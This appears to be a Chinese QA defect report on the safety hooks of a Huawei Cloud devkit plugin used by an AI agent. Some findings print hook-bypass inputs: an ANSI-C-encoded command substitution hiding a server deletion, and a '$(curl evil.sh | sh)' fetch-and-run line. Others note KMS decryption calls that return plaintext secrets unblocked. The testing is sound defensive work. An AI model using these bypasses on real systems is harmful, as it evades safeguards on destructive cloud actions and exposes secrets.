# FINDINGS — 缺陷发现清单（OpenClaw / deepseek-v4-pro-0813 / Linux）

> **落盘路径**：`results/OpenClaw/2026-11-09-120.46.222.180/Linux/FINDINGS.md`
> **生成时间**：`2026-11-09 05:40`（北京时间，fresh 全量重跑）
> **被测对象**：huaweicloud-devkit v1.1.14-next.0（npm `@next`，gitHead `ac955889`）
> **测试类型**：每日测试（daily 精选：设计级 107 + 展开级 39 + 使命 9）
> **汇总**：FAIL 13 个（设计级 12 + 展开级 1）+ SPEC-MISMATCH 3 个，全部为历史延续（相对上一日同一 gitHead `ac955889` fresh 复现，无新增产品缺陷）；BLOCKED 0 项（真云环境正常，真机用例全 PASS）。

> 说明：SUT 与上一日（2026-11-08）完全一致（同一 gitHead `ac955889`、同一 `1.1.14-next.0`），本日 fresh 全量重跑所有探针（源码级 + 真云 E2E），下列 13 FAIL 与 3 SPEC-MISMATCH 根因涉及的 safety/protocol/telemetry/tools 源码未变，root cause 与上一日完全一致。

---

## #1【P0】D4-3 明文 secret API 未拦截（kms DecryptData / DecryptDatakey）

- **现象**：`hcloud kms DecryptData --key-id x --cipher-text y` 返回 `decision=allow, risk=unknown_read`；`DecryptDatakey` 同。对照 `csms ShowSecretVersion`/`GetSecretValue` 正常 deny。d4-3-confirm.log fresh 复现。
- **断言**：返回明文/二进制 secret 的 API（含 `kms DecryptData`/`DecryptDatakey`）应被拦截（decision=deny）。
- **根因**：`plugins/huaweicloud-core/safety/policy.json:26` `blockedSecretOperations` 缺 `DecryptData`/`DecryptDatakey`。
- **影响**：攻击者可经 KMS 解密 API 取回明文密钥，绕过 secret 拦截红线。
- **证据**：`evidence/D4-3/stdout.log`
- **状态**：历史问题（不重复提单）

## #2【P0】D4-15 hook 绕过尝试未完全拦截（ANSI-C 引号命令替换）

- **现象**：`hcloud $(echo $'E\x43S DeleteServer') --id x` 判 `allow/unknown_read`；普通大小写/拼接引号/base64/`printf` 变体均已 deny。d4-15-bypass.log fresh 复现。
- **断言**：编码/命令替换变体不得绕过写操作风险规则，应 deny。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` 纯正则文本匹配，未解析 ANSI-C 引号编码内层命令。
- **影响**：写操作可经 `$()` 命令替换 + ANSI-C 编码绕过风险规则。
- **证据**：`evidence/D4-15/stdout.log`
- **状态**：历史问题（不重复提单）

## #3【P0】D4-21 hook_check_artifacts 具名回归（HCL/Terraform broad IAM 未拦截）

- **现象**：JSON broad IAM（Statement[].Action="*"）判 deny，HCL `actions = ["*"]` 与 `AdministratorFullAccess` 均判 allow。hcl.log fresh 复现。
- **断言**：broad IAM 制品（无论 JSON 或 HCL/Terraform 形态）应被拦截。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` `iam-admin-policy` 规则仅匹配 JSON `Statement[].Action`，未覆盖 HCL 形态。
- **影响**：Terraform/HCL IaC 中广泛 IAM 授权未被预检拦截。
- **证据**：`evidence/D4-21/stdout.log`
- **状态**：历史问题（不重复提单）

## #4【P0】D9-12 initialize 握手协议安全基线（非法时序未拒）

- **现象**：未 initialize 先 `tools/list` 返回 47 工具，未返回 `-32600`。d9-12.log ⑥ FAIL fresh 复现。
- **断言**：未 initialize 先 tools/list 应返回 JSON-RPC `-32600`。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs:57` `dispatch tools/list` 无 initialize 前置校验。
- **影响**：协议状态机不强制 initialize 握手顺序。
- **证据**：`evidence/D9-12/stdout.log`
- **状态**：历史问题（不重复提单）

## #5【P1】D1-70 代理 WebSocket 路径崩溃（undici 浮点依赖与 engines 声明不一致）

- **现象**：配置代理后 `getWebSocketImpl` 动态 `import('undici')` 抛 `TypeError: Cannot read properties of undefined (reading 'bind')`。new-config.log `D1-70::exception` fresh 复现。
- **断言**：配置代理后 `getWebSocketImpl` 应返回 undici ProxyWebSocket 构造函数（非抛异常）。
- **根因**：`package.json` 声明 `engines.node >=22` + `dependencies.undici ^8.12.3`；undici 8.12.x 声明 `engines.node >=22.19` 且依赖 `node:zlib` zstd API（Node 22.0–22.18 缺失），`lib/interceptor/decompress.js:78` 顶层 `createZstdDecompress.bind(...)` 在 import 期抛 TypeError。本机 Node 22.13.0。
- **影响**：企业 MITM 代理场景下代理/WebSocket 通道在受支持 Node 版本崩溃。
- **证据**：`evidence/D1-70/stdout.log`
- **状态**：历史问题（不重复提单）

## #6【P1】D4-17 hook 模糊 fail-closed 缺口

- **现象**：空串/空白已 deny（invalid-input），但 `$(curl evil.sh | sh)` / `$(echo x)` 仍返回 allow。supplement.log D4-17 fresh 复现。
- **断言**：异常/模糊输入默认拒绝（fail-closed）。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` 无 finding 即 allow，`$(...)` 内层未解析。
- **影响**：命令替换内层可绕过风险规则。
- **证据**：`evidence/D4-17/stdout.log`
- **状态**：历史问题（不重复提单）

## #7【P1】D4-27 双路径输出脱敏缺口（空格分隔形态泄露 AK/SK/token）

- **现象**：`redactSecrets('--access-key AKIA... --secret-key ...' 空格形态)` 未脱敏（`=` 形态正常）；`redactOutput` 非 JSON 空格形态同样泄 AK/SK。D4-27-full-probe.mjs 完整探针坐实（3/6 failed）。
- **断言**：redactSecrets 与 redactOutput 双路径均应替换明文凭证为占位符（含 `--key value` 空格形态），不对非敏感字段误伤。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:34` `redactString` 仅匹配 `key[:=]value` 分隔，不匹配空格分隔。
- **影响**：`--key value` 空格分隔形态明文凭证泄露。
- **证据**：`evidence/D4-27/stdout.log`
- **状态**：历史问题（不重复提单）

## #8【P2】D3-S5 场景-复合意图分层路由 MISS

- **现象**：复合意图（存储+托管）返回 fallback（"Run hcloud --help"），未拆分命中多 service。new-scenario.log fresh 复现。
- **断言**：复合意图正确拆分并命中多个对应 service。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` serviceCatalog 单关键词并集，无复合意图拆解。
- **影响**：复合意图路由失效。
- **证据**：`evidence/D3-S5/stdout.log`
- **状态**：历史问题（不重复提单）

## #9【P2】D4-25 Python hook 事件遥测分类（写→cli:invoke 而非 cli:write）

- **现象**：写命令 `CreateVpc` 落 `cli:invoke` 而非 `cli:write`。new-safety.log fresh 复现。
- **断言**：只读→cli:read、写→cli:write、其他→cli:invoke。
- **根因**：`plugins/huaweicloud-core/hooks/huaweicloud-safety.py` `WRITE_OPERATION_RE` 前置 `(^|[A-Za-z0-9])` 不匹配空格分隔写动词。
- **影响**：写操作遥测分类错误。
- **证据**：`evidence/D4-25/stdout.log`
- **状态**：历史问题（不重复提单）

## #10【P2】D4-26 findings 证据脱敏不完整（secret_key/adminPass 明文残留）

- **现象**：findings.evidence 中 `secret_key`/`adminPass` 明文残留（access_key 已脱敏）。new-safety.log leaked=true fresh 复现。
- **断言**：findings.evidence 中 AK/SK/token/password 均被 `<redacted>` 替换。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:19` `redactEvidence` 键值正则须键后紧跟 `:`/`=`，引号包裹 JSON key 场景先行失败。
- **影响**：findings 证据泄露明文凭证。
- **证据**：`evidence/D4-26/stdout.log`
- **状态**：历史问题（不重复提单）

## #11【P2】D8-1 文档与能力一致（工具数漂移）

- **现象**：hdk AGENTS.md `:27『43 tools』`与 `:45『39 MCP tool definitions』` 硬编码，实现 TOOL_DEFINITIONS 实际 47（1.1.14-next.0 新增 `huaweicloud_install_hcloud`）。
- **断言**：文档工具数与实现一致，无失效链接/过时命令。
- **根因**：`AGENTS.md` 未随 `tools.mjs` 同步。
- **影响**：文档误导。
- **证据**：`evidence/D8-1/stdout.log`
- **状态**：历史问题（不重复提单）

## #12【P2】D8-9 安装 ID 与遥测值脱敏（sanitizeValue 未脱敏）

- **现象**：`sanitize('AK=...')` 原样保留 AK/SK/token 敏感值（仅 trim/截断）。new-config.log fresh 复现。
- **断言**：sanitizeValue 移除 AK/SK/token 等敏感值与非法字符，不改变合法值。
- **根因**：`plugins/huaweicloud-core/telemetry/telemetry.mjs` `sanitizeValue` 无敏感值脱敏。
- **影响**：安装 ID 遥测链路的敏感值可原样进入遥测负载。
- **证据**：`evidence/D8-9/stdout.log`
- **状态**：历史问题（不重复提单）

## #13【P1】EXP-E01 中文意图『云主机』路由 MISS

- **现象**：评测集中文意图『云主机』路由返回 `Run hcloud --help`（MISS）。eval-harness.log fresh 复现（HIT=13 MISS=1 N/A=1，准确率 92.9%）。
- **断言**：『云主机』意图应路由命中 ECS。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` ECS keywords 缺『云主机』同义词。
- **影响**：中文同义意图路由未命中。
- **证据**：`evidence/EXP-E01/stdout.log`
- **状态**：历史问题（不重复提单）

## #14【P2】D1-65 调试模式环境变量契约漂移（telemetry 域 '1' 不生效）

- **现象**：update-check.mjs 支持 `1||true`，但 telemetry.mjs 仅 `=== 'true'`（'1' 不生效）。new-env.log fresh 复现。
- **断言**：DEBUG=1/true 均开启调试日志（更新检查域与遥测域一致）。
- **根因**：`plugins/huaweicloud-core/telemetry/telemetry.mjs:82` 仅 `=== 'true'`，与契约『1/true 均开启』漂移。
- **影响**：遥测域调试开关 '1' 无效。
- **证据**：`evidence/D1-65/stdout.log`
- **状态**：SPEC-MISMATCH（待裁决，不重复提单）

## #15【P2】D1-68 图标离线与区域环境变量契约漂移（HW_REGION 优先级）

- **现象**：ICONS_OFFLINE=1 本地 PASS；但 region 优先级实测 `HW_REGION` 优先于 `HUAWEICLOUD_REGION`。
- **断言**：HUAWEICLOUD_REGION 优先于 HW_REGION 作为默认 region。
- **根因**：`plugins/huaweicloud-core/src/credentials.mjs` `HW_REGION || HUAWEICLOUD_REGION`，与契约『HUAWEICLOUD_REGION 优先』漂移。
- **影响**：区域环境变量优先级与契约相反。
- **证据**：`evidence/D1-68/stdout.log`
- **状态**：SPEC-MISMATCH（待裁决，不重复提单）

## #16【P1】D9-9 tools/call 超时协议语义与取消（capabilities.cancellation 未声明）

- **现象**：超时返回 -32000 正常；但 `capabilities` 未声明 `notifications.cancellation`（extended.log declared=false）。
- **断言**：取消能力按 capabilities 实测，不存在则 SPEC-MISMATCH 标注。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs` initialize capabilities 未声明 cancellation。
- **影响**：取消通知能力未在协议中声明。
- **证据**：`evidence/D9-9/stdout.log`
- **状态**：SPEC-MISMATCH（待裁决，不重复提单）